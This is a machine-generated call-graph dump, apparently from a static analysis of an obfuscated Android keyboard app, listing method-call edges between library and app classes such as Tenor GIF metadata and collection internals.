SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: java.lang.String valueOf(java.lang.Object)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r14.<mag: void <init>(java.lang.String,int,int)>("AVATAR_STICKER_IMAGE", 14, 14) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
STATIC edge: staticinvoke <ojg: void d(java.lang.Object,java.lang.String)>($r0, "<this>") in <nvw: void k(java.lang.Object[],java.lang.Object[],int,int,int)> ==> <ojg: void d(java.lang.Object,java.lang.String)>
STATIC edge: $i2 = staticinvoke <java.lang.Math: int min(int,int)>($i2, $i1) in <kwe: int U(int,int,int)> ==> <java.lang.Math: int min(int,int)>
CLINIT edge: staticinvoke <hef: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <hef: void <clinit>()>
VIRTUAL edge: $z0 = virtualinvoke $r11.<lma: boolean isEmpty()>() in <lmb: lme f()> ==> <java.util.AbstractCollection: boolean isEmpty()>
INTERFACE edge: $i1 = interfaceinvoke $r4.<java.util.Set: int size()>() in <lqs: boolean equals(java.lang.Object)> ==> <lrg: int size()>
INTERFACE edge: $i0 = interfaceinvoke $r10.<java.util.Collection: int size()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <ljf: int size()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: java.lang.String format(java.lang.String,java.lang.Object[])> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke r0.<lvq: int a()>() in <lvq: int size()> ==> <lvq: int a()>
STATIC edge: $r2 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r2, $i0) in <ljd: void t(int)> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
STATIC edge: $z0 = staticinvoke <java.util.Arrays: boolean equals(byte[],byte[])>($r4, $r5) in <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)> ==> <java.util.Arrays: boolean equals(byte[],byte[])>
SPECIAL edge: specialinvoke $r26.<mag: void <init>(java.lang.String,int,int)>("TENOR_AUTOCOMPLETE_METADATA", 26, 26) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljd: java.lang.Object h(int)>($i0) in <ljd: java.util.Map m()> ==> <ljd: java.lang.Object h(int)>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(", ") in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r14.<gcs: void <init>(hbv,lma,int)>(r0, $r9, 12) in <hbv: void j()> ==> <gcs: void <init>(hbv,lma,int)>
STATIC edge: staticinvoke <iye: void I(boolean,java.lang.Object)>($z0, "Arrays already allocated") in <ljf: int b()> ==> <iye: void I(boolean,java.lang.Object)>
VIRTUAL edge: $r5 = virtualinvoke $r7.<lsm: java.lang.Object d(lsz)>($r3) in <lsd: boolean b(lsr)> ==> <lsm: java.lang.Object d(lsz)>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Exception: void <init>()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
CLINIT edge: staticinvoke <lql: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lql: void <clinit>()>
STATIC edge: $z0 = staticinvoke <lvr: boolean e(int,int)>($i0, 0) in <lvr: void <init>(java.util.List)> ==> <lvr: boolean e(int,int)>
INTERFACE edge: $r8 = interfaceinvoke $r6.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lsb: java.lang.Object next()>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.CharSequence,int,int)>($r2, $i1, $i3) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.CharSequence,int,int)>
SPECIAL edge: specialinvoke $r12.<java.lang.IllegalStateException: void <init>(java.lang.String)>("Recursive update") in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <java.lang.IllegalStateException: void <init>(java.lang.String)>
STATIC edge: $i4 = staticinvoke <izw: int af(int,int)>($i3, $i1) in <ljd: int f(java.lang.Object)> ==> <izw: int af(int,int)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(13) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
SPECIAL edge: specialinvoke $r3.<qc: void <init>()>() in <ivw: void <clinit>()> ==> <qc: void <init>()>
VIRTUAL edge: $r3 = virtualinvoke r0.<ljd: java.util.Map o()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: java.util.Map o()>
STATIC edge: $r2 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
INTERFACE edge: $i0 = interfaceinvoke $r10.<java.util.Collection: int size()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lqr: int size()>
VIRTUAL edge: $i0 = virtualinvoke r0.<java.lang.String: int compareTo(java.lang.String)>($r2) in <java.lang.String: int compareTo(java.lang.Object)> ==> <java.lang.String: int compareTo(java.lang.String)>
INTERFACE edge: $r0 = interfaceinvoke $r2.<lwi: java.lang.StackTraceElement[] b(java.lang.Class,int)>($r1, $i0) in <lwf: java.lang.StackTraceElement[] b(java.lang.Class,int)> ==> <lwk: java.lang.StackTraceElement[] b(java.lang.Class,int)>
VIRTUAL edge: $r1 = virtualinvoke r0.<ljd: java.lang.Object k(int)>($i0) in <ljd: java.lang.Object get(java.lang.Object)> ==> <ljd: java.lang.Object k(int)>
INTERFACE edge: $r3 = interfaceinvoke $r8.<java.util.Map$Entry: java.lang.Object getKey()>() in <lmb: lme f()> ==> <ljb: java.lang.Object getKey()>
STATIC edge: $r0 = staticinvoke <lsz: lsz c(java.lang.String,java.lang.Class)>("ratelimit_period", class "Llst;") in <lsl: void <clinit>()> ==> <lsz: lsz c(java.lang.String,java.lang.Class)>
CLINIT edge: staticinvoke <luk: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <luk: void <clinit>()>
STATIC edge: $r5 = staticinvoke <java.lang.Class: java.lang.Class forName(java.lang.String)>($r4) in <luk: lum a(java.lang.String[])> ==> <java.lang.Class: java.lang.Class forName(java.lang.String)>
VIRTUAL edge: $r17 = virtualinvoke $r15.<java.lang.Class: java.lang.reflect.Constructor getDeclaredConstructor(java.lang.Class[])>($r16) in <lvm: lum j()> ==> <java.lang.Class: java.lang.reflect.Constructor getDeclaredConstructor(java.lang.Class[])>
STATIC edge: $r10 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l r(j$.util.concurrent.s)>($r18) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l r(j$.util.concurrent.s)>
SPECIAL edge: specialinvoke $r2.<java.lang.NullPointerException: void <init>(java.lang.String)>($r0) in <ojg: void c(java.lang.Object,java.lang.String)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r11.<java.lang.IllegalArgumentException: void <init>(java.lang.String,java.lang.Throwable)>($r3, $r13) in <ivw: ivw d(java.util.Locale)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String,java.lang.Throwable)>
SPECIAL edge: specialinvoke $r12.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r7) in <ivv: ivw b(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("extension subtags are out of order: ") in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r3.<java.lang.NullPointerException: void <init>(java.lang.String)>($r1) in <lri: void t(java.lang.Object,int)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
STATIC edge: $r3 = staticinvoke <iye: java.lang.String r(java.lang.String,java.lang.Object[])>("%s (%s) must be less than size (%s)", $r4) in <iye: void O(int,int)> ==> <iye: java.lang.String r(java.lang.String,java.lang.Object[])>
VIRTUAL edge: $i0 = virtualinvoke $r2.<lvr: int size()>() in <lvr: void <init>(lvr,lvr)> ==> <java.util.AbstractMap: int size()>
SPECIAL edge: specialinvoke $r10.<java.lang.StringBuilder: void <init>()>() in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke $r6.<lvs: int compareTo(java.lang.Enum)>($r7) in <jlu: int compare(java.lang.Object,java.lang.Object)> ==> <java.lang.Enum: int compareTo(java.lang.Enum)>
INTERFACE edge: $i0 = interfaceinvoke $r10.<java.util.Collection: int size()>() in <lmb: lme f()> ==> <lql: int size()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lqs: boolean equals(java.lang.Object)>
INTERFACE edge: $r6 = interfaceinvoke $r4.<java.util.Set: java.util.Iterator iterator()>() in <lqs: boolean equals(java.lang.Object)> ==> <lrg: java.util.Iterator iterator()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
STATIC edge: $r3 = staticinvoke <iye: java.lang.String r(java.lang.String,java.lang.Object[])>("%s (%s) must not be negative", $r4) in <iye: void O(int,int)> ==> <iye: java.lang.String r(java.lang.String,java.lang.Object[])>
VIRTUAL edge: $i2 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ivw: int hashCode()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <gsv: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(", error index: ") in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(17) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
VIRTUAL edge: $r5 = virtualinvoke r0.<ljd: java.lang.Object[] x()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: java.lang.Object[] x()>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(0) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
INTERFACE edge: $r2 = interfaceinvoke $r1.<java.util.Map: java.util.Set entrySet()>() in <ljd: java.util.Iterator l()> ==> <java.util.LinkedHashMap: java.util.Set entrySet()>
CLINIT edge: staticinvoke <ltr: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <ltr: void <clinit>()>
INTERFACE edge: $r3 = interfaceinvoke $r8.<java.util.Map$Entry: java.lang.Object getKey()>() in <lmb: lme f()> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getKey()>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Flag [") in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("TenorTrendingSearchTermMetadata", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
INTERFACE edge: $i1 = interfaceinvoke $r4.<java.util.Set: int size()>() in <lri: boolean j(java.util.Set,java.lang.Object)> ==> <lrg: int size()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<lma: boolean d()>() in <lma: boolean equals(java.lang.Object)> ==> <lqr: boolean d()>
STATIC edge: $r3 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i1) in <iye: void D(boolean,java.lang.String,int,int)> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(11) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(": ") in <luk: lum a(java.lang.String[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: staticinvoke <iej: void g(java.lang.String,iec)>("InputMethodEntryManager_Initialized", $r3) in <hnt: void <clinit>()> ==> <iej: void g(java.lang.String,iec)>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.RuntimeException: void <init>(java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>($r3) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <lid: int hashCode()>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lmb: lme f()> ==> <lje: java.lang.Object next()>
VIRTUAL edge: $r4 = virtualinvoke $r4.<java.lang.String: java.lang.String concat(java.lang.String)>($r5) in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Throwable: void <init>()>() in <java.lang.Error: void <init>()> ==> <java.lang.Throwable: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <java.util.AbstractSet: int hashCode()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <kzs: boolean d(java.lang.Object,java.lang.Object)> ==> <java.util.AbstractSet: boolean equals(java.lang.Object)>
STATIC edge: $i1 = staticinvoke <java.lang.Integer: int numberOfLeadingZeros(int)>($i0) in <ljd: void A(int)> ==> <java.lang.Integer: int numberOfLeadingZeros(int)>
CLINIT edge: staticinvoke <ose: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <ose: void <clinit>()>
INTERFACE edge: $r2 = interfaceinvoke $r0.<java.util.List: java.lang.Object[] toArray(java.lang.Object[])>($r1) in <ivw: java.lang.String[] Q(java.util.List)> ==> <java.util.ArrayList: java.lang.Object[] toArray(java.lang.Object[])>
SPECIAL edge: specialinvoke $r1.<java.util.concurrent.atomic.AtomicLong: void <init>()>() in <lsu: void <init>()> ==> <java.util.concurrent.atomic.AtomicLong: void <init>()>
VIRTUAL edge: virtualinvoke r0.<ljd: void q(int)>(3) in <ljd: void <init>()> ==> <ljd: void q(int)>
CLINIT edge: staticinvoke <lqq: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lqq: void <clinit>()>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(16) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lsb: java.lang.Object a(int)>($i1) in <lsb: java.lang.Object next()> ==> <lkm: java.lang.Object a(int)>
VIRTUAL edge: $z0 = virtualinvoke $r17.<java.util.concurrent.atomic.AtomicLong: boolean compareAndSet(long,long)>($l2, $l3) in <lsd: boolean b(lsr)> ==> <java.util.concurrent.atomic.AtomicLong: boolean compareAndSet(long,long)>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])>($r2, $r5) in <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l[] e(j$.util.concurrent.l[],j$.util.concurrent.l)> ==> <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: boolean isEmpty()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $r6 = staticinvoke <lvs: lvs a(java.lang.Object)>($r1) in <jlu: int compare(java.lang.Object,java.lang.Object)> ==> <lvs: lvs a(java.lang.Object)>
VIRTUAL edge: $r5 = virtualinvoke $r5.<lqd: lqd c()>() in <lmb: lme f()> ==> <lqd: lqd c()>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i0) in <lri: void t(java.lang.Object,int)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
INTERFACE edge: $r3 = interfaceinvoke $r5.<java.util.Iterator: java.lang.Object next()>() in <lri: boolean V(java.util.List,java.lang.Object)> ==> <lsb: java.lang.Object next()>
VIRTUAL edge: $i6 = virtualinvoke $r3.<java.lang.Object: int hashCode()>() in <lma: lma i(int,java.lang.Object[])> ==> <lid: int hashCode()>
STATIC edge: $z0 = staticinvoke <ivw: boolean x(char)>($c1) in <ivw: boolean F(java.lang.String)> ==> <ivw: boolean x(char)>
VIRTUAL edge: $r7 = virtualinvoke $r3.<lmb: lme f()>() in <hbv: void j()> ==> <lmb: lme f()>
INTERFACE edge: $z0 = interfaceinvoke $r8.<java.util.Iterator: boolean hasNext()>() in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.a: boolean hasNext()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $l1 = virtualinvoke $r3.<j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>(class "Lj$/util/concurrent/c;", "value") in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke r0.<lkh: int size()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lql: int size()>
STATIC edge: $i0 = staticinvoke <kwe: int U(int,int,int)>($i0, 1, 1073741823) in <ljf: void i(int)> ==> <kwe: int U(int,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.String: boolean equals(java.lang.Object)>($r4) in <lsp: boolean equals(java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
STATIC edge: $r1 = staticinvoke <iye: java.lang.Object V(java.lang.Object,java.lang.Object)>($r3, $r4) in <lme: lma d(java.lang.Object)> ==> <iye: java.lang.Object V(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lma: lma i(int,java.lang.Object[])> ==> <lkq: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lsc: void <init>(lto)> ==> <java.lang.Object: void <init>()>
INTERFACE edge: $z0 = interfaceinvoke $r1.<java.util.Iterator: boolean hasNext()>() in <lri: int b(java.util.Set)> ==> <lsb: boolean hasNext()>
VIRTUAL edge: $r7 = virtualinvoke $r9.<java.lang.StringBuilder: java.lang.String toString()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.String toString()>
INTERFACE edge: $i1 = interfaceinvoke $r4.<java.util.Set: int size()>() in <lqs: boolean equals(java.lang.Object)> ==> <lqr: int size()>
INTERFACE edge: interfaceinvoke $r2.<java.util.List: void clear()>() in <ivv: ivw b(java.lang.String)> ==> <java.util.ArrayList: void clear()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <gbk: void <init>(int)> ==> <java.lang.Object: void <init>()>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r1) in <lrg: void <init>(java.lang.Object)> ==> <iye: java.lang.Object w(java.lang.Object)>
VIRTUAL edge: $i6 = virtualinvoke $r3.<java.lang.Object: int hashCode()>() in <lma: lma i(int,java.lang.Object[])> ==> <java.lang.String: int hashCode()>
STATIC edge: $r2 = staticinvoke <lqq: java.lang.Object s(java.lang.Object[],int,int,int)>($r1, $i0, $i1, 1) in <lqk: void <init>(java.lang.Object[],int)> ==> <lqq: java.lang.Object s(java.lang.Object[],int,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lma: boolean equals(java.lang.Object)>
INTERFACE edge: $r3 = interfaceinvoke $r1.<java.util.Map$Entry: java.lang.Object getValue()>() in <lli: void c(java.util.Map$Entry)> ==> <ljb: java.lang.Object getValue()>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r1) in <mij: void <init>(miy)> ==> <iye: java.lang.Object w(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lid: boolean equals(java.lang.Object)>
VIRTUAL edge: $r1 = virtualinvoke $r0.<j$.sun.misc.b: java.lang.Object g(java.lang.Object,long)>($r2, $l0) in <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)> ==> <j$.sun.misc.b: java.lang.Object g(java.lang.Object,long)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(7) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
STATIC edge: staticinvoke <java.util.Arrays: void sort(java.lang.Object[],java.util.Comparator)>($r2, $r0) in <lkq: lkq A(java.util.Comparator,java.lang.Iterable)> ==> <java.util.Arrays: void sort(java.lang.Object[],java.util.Comparator)>
SPECIAL edge: specialinvoke $r9.<lwk: void <init>()>() in <lwf: void <clinit>()> ==> <lwk: void <init>()>
INTERFACE edge: $z0 = interfaceinvoke $r4.<java.util.Iterator: boolean hasNext()>() in <lri: boolean V(java.util.List,java.lang.Object)> ==> <lsb: boolean hasNext()>
VIRTUAL edge: $i6 = virtualinvoke $r3.<java.lang.Object: int hashCode()>() in <lma: lma i(int,java.lang.Object[])> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
SPECIAL edge: specialinvoke r0.<java.util.AbstractSet: void <init>()>() in <liy: void <init>(ljd)> ==> <java.util.AbstractSet: void <init>()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<lkq: int size()>() in <lkm: void <init>(lkq,int)> ==> <lql: int size()>
VIRTUAL edge: $r1 = virtualinvoke r0.<lid: java.lang.Object getKey()>() in <lid: boolean equals(java.lang.Object)> ==> <lki: java.lang.Object getKey()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractSet: int hashCode()>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("TenorCategoryMetadata", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
STATIC edge: $i2 = staticinvoke <java.lang.Integer: int numberOfLeadingZeros(int)>($i2) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <java.lang.Integer: int numberOfLeadingZeros(int)>
STATIC edge: $i1 = staticinvoke <lma: int e(int)>($i0) in <lqq: lqq r(int,java.lang.Object[],lkt)> ==> <lma: int e(int)>
STATIC edge: $r3 = staticinvoke <lri: java.util.Map$Entry H(java.lang.Object,java.lang.Object)>($r2, $r6) in <llg: java.lang.Object next()> ==> <lri: java.util.Map$Entry H(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r2.<java.lang.NullPointerException: void <init>(java.lang.String)>($r0) in <lvm: java.lang.Object g(java.lang.Object,java.lang.String)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
INTERFACE edge: interfaceinvoke $r9.<lse: void F(java.lang.String,java.lang.Object,java.lang.Object)>("Locale %s has invalid variant: %s", $r0, $r3) in <ivw: ivw d(java.util.Locale)> ==> <lsv: void F(java.lang.String,java.lang.Object,java.lang.Object)>
STATIC edge: $r12 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>($r5, $i2) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>
INTERFACE edge: $r5 = interfaceinvoke $r10.<java.util.Iterator: java.lang.Object next()>() in <hbv: void j()> ==> <lnc: java.lang.Object next()>
SPECIAL edge: specialinvoke $r9.<mly: void <init>(java.lang.Object,java.lang.Object,java.lang.Object)>($r2, $r3, $r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <mly: void <init>(java.lang.Object,java.lang.Object,java.lang.Object)>
STATIC edge: $i6 = staticinvoke <izw: int ac(int)>($i6) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <izw: int ac(int)>
VIRTUAL edge: $r3 = virtualinvoke $r3.<java.lang.String: java.lang.String substring(int,int)>(0, $i0) in <ivw: ivw d(java.util.Locale)> ==> <java.lang.String: java.lang.String substring(int,int)>
STATIC edge: $z1 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: boolean b(j$.util.concurrent.l[],int,j$.util.concurrent.l)>($r3, $i2, $r6) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.ConcurrentHashMap: boolean b(j$.util.concurrent.l[],int,j$.util.concurrent.l)>
STATIC edge: $r2 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r2, $i5) in <lma: lma i(int,java.lang.Object[])> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
VIRTUAL edge: $r4 = virtualinvoke r0.<ljd: int[] w()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: int[] w()>
SPECIAL edge: specialinvoke $r9.<java.lang.StringBuilder: void <init>()>() in <iej: void g(java.lang.String,iec)> ==> <java.lang.StringBuilder: void <init>()>
INTERFACE edge: interfaceinvoke $r5.<java.util.Collection: boolean add(java.lang.Object)>($r2) in <lli: void e(java.lang.Object,java.lang.Object)> ==> <lkh: boolean add(java.lang.Object)>
CLINIT edge: staticinvoke <lvt: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lvt: void <clinit>()>
STATIC edge: $z0 = staticinvoke <lri: boolean j(java.util.Set,java.lang.Object)>(r0, $r1) in <lma: boolean equals(java.lang.Object)> ==> <lri: boolean j(java.util.Set,java.lang.Object)>
STATIC edge: $r2 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
STATIC edge: staticinvoke <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>($r5, 0, $r6, 6, $i1) in <lma: lma w(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object[])> ==> <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>
STATIC edge: $r3 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r3) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
STATIC edge: $i2 = staticinvoke <java.lang.Integer: int numberOfLeadingZeros(int)>($i2) in <j$.util.concurrent.ConcurrentHashMap: void q(int)> ==> <java.lang.Integer: int numberOfLeadingZeros(int)>
STATIC edge: $i6 = staticinvoke <java.lang.Math: int max(int,int)>(1, $i6) in <ljf: boolean add(java.lang.Object)> ==> <java.lang.Math: int max(int,int)>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("at index ") in <lri: void t(java.lang.Object,int)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke $r0.<java.lang.String: int length()>() in <ivw: boolean v(java.lang.String)> ==> <java.lang.String: int length()>
SPECIAL edge: specialinvoke r0.<lkg: void c(java.lang.Object)>($r1) in <lly: void j(java.lang.Object)> ==> <lkg: void c(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.util.AbstractSet: void <init>()>() in <ljf: void <init>()> ==> <java.util.AbstractSet: void <init>()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractSet: int hashCode()>
